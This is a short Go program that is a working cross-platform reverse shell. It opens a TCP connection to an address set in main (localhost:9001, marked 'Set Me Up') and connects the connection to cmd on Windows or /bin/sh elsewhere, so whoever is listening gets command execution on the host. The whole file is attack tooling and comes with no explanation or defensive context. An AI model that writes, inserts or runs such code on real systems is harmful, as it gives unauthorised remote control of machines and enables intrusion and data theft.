package main

import (
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"sync"
)

func shell(c net.Conn, wg *sync.WaitGroup) {
	fmt.Println("Creating Shell")

	defer wg.Done()

	getShell()(c)
}

func getShell() func(net.Conn) {
	if runtime.GOOS == "windows" {
		return _shellWindows
	}
	return _shellLinux
}

func _shellWindows(conn net.Conn) {
	c := exec.Command("cmd")
	c.Stdin = conn
	c.Stdout = conn
	c.Stderr = conn
	c.Run()
}

func _shellLinux(conn net.Conn) {
	c := exec.Command("/bin/sh")
	c.Stdin = conn
	c.Stdout = conn
	c.Stderr = conn
	c.Run()
}

func reverseShell(ip string, port string, wg *sync.WaitGroup) {
	fmt.Println("Creating Reverse Shell")

	// Handle waitgroup
	defer wg.Done()

	c, err := net.Dial("tcp", ip+":"+port)
	if err != nil {
		fmt.Println("Unable to create reverse shell to:", ip+":"+port)
		return
	}

	wg.Add(1)
	go shell(c, wg)
}

func main() {
	var wg sync.WaitGroup

	// Set Me Up
	Addr := "127.0.0.1"
	Port := "9001"

	wg.Add(1)
	go reverseShell(Addr, Port, &wg)

	wg.Wait()
}
